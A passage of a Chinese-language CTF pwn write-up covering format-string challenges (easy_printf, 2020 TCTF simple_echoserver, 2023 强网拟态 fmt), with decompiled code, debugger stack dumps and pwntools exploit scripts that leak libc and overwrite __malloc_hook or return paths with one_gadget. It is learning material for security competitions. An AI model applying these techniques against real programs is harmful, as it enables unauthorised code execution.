class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">right = mid</span><br><span class="line">io.close()</span><br><span class="line">flag += possible_list[left]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br><span class="line">end = time.time()</span><br><span class="line">success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><p>网上找的exp,看了一下,每一段代码都有使用smc,但实际上在mmap后如果调用一个read往新mmap的内存写上想要的指令就不需要smc了</p><p>即第一次需要smc时构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(addr,len....)</span><br><span class="line">read(0,addr,len)</span><br><span class="line">jmp addr</span><br></pre></td></tr></table></figure><h1 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h1><p><strong>标签:格式化字符串|printf触发malloc|%a占位符</strong></p><p>保护机制全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/easy_printf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>程序的主体就是两个printf的格式化字符串攻击,不过一个是正常的print但使用一次就会使用系统调用退出,还有一个是削弱了格式化字符串漏洞的__printf_chk函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy you the last time!&quot;</span>);</span><br><span class="line">  s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">0x80</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  v3 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your fmt: &quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">    s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">5uLL</span>)] = <span class="number">0</span>;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, s, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>比较常见的思路是先泄露栈再利用%n打rop,但因为printf只能使用一次就比较难办了</p><p>__printf_chk对格式化字符串的限制很大,几乎没有什么可利用的功能了</p><p>这就需要用到一个暂时还搞不太清楚原理的知识点,在__printf_chk函数格式化字符串用且只能用一个或者两个%a填充,能够打印出来stdin和stdout指针,以此泄露libc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%a</span><br><span class="line">0x0.07f6e76f5498p-1022</span><br><span class="line">%a%a</span><br><span class="line">0x0.07ffa5ebb098p-10220x0.07ffa5ebb16ap-1022</span><br><span class="line">%a%a%a</span><br><span class="line">null</span><br></pre></td></tr></table></figure><p>虽然不太懂原理,而且本地另写一个程序并没有复现成功,但在应对__printf_chk时不失为一个尝试</p><p>此后还要利用printf在输出超过65535长度的内容时会触发malloc这个知识点,并以此为基础修改malloc_hook为one_gadget并触发</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr2</span>(<span class="params">offset, addr, data, written</span>):</span><br><span class="line"><span class="keyword">global</span> cnt = <span class="number">0</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">address = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">cur = x</span><br><span class="line"><span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="built_in">round</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add).encode()</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>).encode()</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">written += to_add</span><br><span class="line">payload += <span class="built_in">round</span></span><br><span class="line">address += p64(addr+cnt)</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line"><span class="comment"># trigger malloc</span></span><br><span class="line"><span class="keyword">return</span> (payload+<span class="string">b&quot;%65537c&quot;</span>).ljust(<span class="number">0x50</span>,<span class="string">b&quot;_&quot;</span>) + address</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your fmt: &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%a%a\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc.address = (<span class="built_in">int</span>(p.recv(<span class="number">11</span>),<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) - libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">hook_addr=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(hook_addr))</span><br><span class="line">one=libc.address+<span class="number">0xe3b04</span></span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = fmtstr2(<span class="number">6</span>,hook_addr,p64(one)[:<span class="number">6</span>],<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里看ruan师傅的exp还学到了格式化字符串的%n的一个新姿势</p><p>即%hhn只写一个字节,如果写的数大于255那么只保留最后一个字节的数据</p><p>以此来稳定构造格式化字符串任意写</p><h1 id="2020tctf-simple-echoserver"><a href="#2020tctf-simple-echoserver" class="headerlink" title="2020tctf-simple_echoserver"></a>2020tctf-simple_echoserver</h1><p><strong>标签:格式化字符串|*占位符</strong></p><p>checksec发现保护全开</p><p>看一下程序的流程,读入name和phonenumber</p><p>拼接格式化字符串后由stderr输出,此处存在格式化字符串漏洞,不过只能利用一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_13C1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">snprintf</span>(byte_4060, <span class="number">0x100</span>uLL, <span class="string">&quot;[USER] name: %s; phone: %ld\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1, *(_QWORD *)(a1 + <span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, byte_4060);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是要一次利用printf的机会就完成利用,这就难办了</p><p>在没有其他帮助下,正常来说应该最少要两次格式化字符串利用才能完成利用</p><p>这里学到一个新姿势<code>*占位符</code>,*占位符以对应的函数参数的值作为一次变量输出的宽度</p><p>例如<code>printf(&quot;%*c%n&quot;,123,&#39;a&#39;,&amp;var);</code>就会输出123宽度的字符a</p><p>结合*??$即可获取栈上任意的值作为宽度</p><p>但这又有什么用呢?</p><p>如果我们结合%n,那么加上之前输出的宽度,岂不是可以在无输出的情况下完整的写一个地址</p><p>那么思路就有了</p><p>断点下在fprintf处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff7221d658</span> —▸ <span class="number">0x55d2c7dcf41a</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff7221d660</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fff7221d668</span> —▸ <span class="number">0x55d2c7dd2160</span> ◂— <span class="string">&#x27;%*48$c%801983c%26$n%221c%7$hhn&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fff7221d670</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff7221d678</span> —▸ <span class="number">0x55d2c7dcf443</span> ◂— lea rdi, [rip + <span class="number">0xc5b</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff7221d680</span> —▸ <span class="number">0x7fe104ff78a0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff7221d688</span> —▸ <span class="number">0x7fe104e9fb9f</span> (_IO_file_underflow+<span class="number">383</span>) ◂— test rax, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff7221d690</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fff7221d698</span> —▸ <span class="number">0x7fe104e70d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov rcx, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fff7221d6a0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x7fff7221d6a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x7fff7221d6b0</span> ◂— <span class="number">0x40584a0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x7fff7221d6b8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x7fff7221d6c0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0x7fff7221d6c8</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x7fff7221d6d0</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│     <span class="number">0x7fff7221d6d8</span> —▸ <span class="number">0x55d2c7dcf0f0</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│     <span class="number">0x7fff7221d6e0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│     <span class="number">0x7fff7221d6e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│     <span class="number">0x7fff7221d6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│     <span class="number">0x7fff7221d6f8</span> —▸ <span class="number">0x55d2c7dcf348</span> ◂— mov rcx, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│     <span class="number">0x7fff7221d700</span> —▸ <span class="number">0x7fe104ff84a0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│     <span class="number">0x7fff7221d708</span> —▸ <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│     <span class="number">0x7fff7221d710</span> ◂— <span class="string">&#x27;111111111111111111111111&#x27;</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7fff7221d730</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7fff7221d738</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7fff7221d740</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│     <span class="number">0x7fff7221d748</span> —▸ <span class="number">0x55d2c7dcf28d</span> ◂— mov r12d, eax</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7fff7221d750</span> ◂— <span class="number">0x100c7dcf4e0</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│     <span class="number">0x7fff7221d758</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│     <span class="number">0x7fff7221d760</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7fff7221d768</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7fff7221d778</span> —▸ <span class="number">0x55d2c7dcf3b3</span> ◂— mov rdx, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7fff7221d780</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span class="number">0x7fff7221d788</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│     <span class="number">0x7fff7221d798</span> —▸ <span class="number">0x55d2c7dcf4d0</span> ◂— mov eax, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0x7fff7221d7a0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0x7fff7221d7a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0x7fff7221d7b8</span> —▸ <span class="number">0x7fe104e33083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure><p><code>2c:0160│</code>对应的参数偏移是48,于是%*48$c,打印0x7ffff7de6083宽度(有点哈人,幸好alarm给了600秒，而且还重定向了错误流)的字符出来</p><p>然后通过<code>16:00b0</code>%n改写<code>1a:00d0</code>为one_gadget</p><p>再然后就要考虑如何将返回流劫持到该处,发现程序会两次回栈,所以可以通过<code>03:0018│</code>修改<code>27:0138</code>处的rbp值,使第二次回栈的时候进入控制的流</p><p>于是<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dev_null = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./se&quot;</span>,stderr=dev_null)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;b fprintf</span></span><br><span class="line"><span class="string">b *$rebase(0x1335)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;%*48$c%801983c%26$n%221c%7$hhn\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your phone: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;yourself!&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;~.\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里还有最后一个槛,不算难但要发现着实有点困难</p><p>就是要在栈上构造出一个指向栈上的函数地址的栈,即出现<code>03:0018</code>这样的栈</p><p>正常来到fprintf并没有这样一个栈内存</p><p>不过很巧的是可以发现<code>16:00b0</code>处的值始终指向我们输入的字符的结尾</p><p>而在<code>1a:00d0</code>处有一个函数指针,所以如果刚好发送18个数字字符的话,就能获得一个满足要求的栈内存了</p><h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h2><p><code>/dev/null</code> 是一个特殊的设备文件，用于丢弃数据。在Unix-like系统中，<code>/dev/null</code> 表示空设备，写入它的数据会被丢弃，读取它则会立即得到一个文件结尾（End-of-File）。</p><h1 id="2023第六届强网拟态-fmt"><a href="#2023第六届强网拟态-fmt" class="headerlink" title="2023第六届强网拟态-fmt"></a>2023第六届强网拟态-fmt</h1><p><strong>标签:格式化字符串</strong></p><p>这题一个难点在于格式化字符串不在栈上</p><p>当然影响其实并不很大</p><p>首先程序会打印一个栈地址的最后两个字节</p><p>断在printf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde48</span> —▸ <span class="number">0x555555555250</span> (main+<span class="number">167</span>) ◂— mov edi, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde50</span> —▸ <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde58</span> ◂— <span class="number">0xafe57b979d2b8b00</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7ffff7de6083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffde78</span> —▸ <span class="number">0x7fffffffdf58</span> —▸ <span class="number">0x7fffffffe2aa</span> ◂— <span class="string">&#x27;/home/aichch/pwn/fmt&#x27;</span></span><br></pre></td></tr></table></figure><p>可以发现此时栈上有一个三级栈指针06:0030</p><p>那么先利用%n修改0x7fffffffe2aa为0x7fffffffe248,再利用%n修改0x555555555250为read的地址</p><p>就可以多次利用格式化字符串漏洞了</p><p>泄露,打one_gadget就能完成利用</p><p><strong>exp:(自己写的未完成但大致是这么个思路)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, 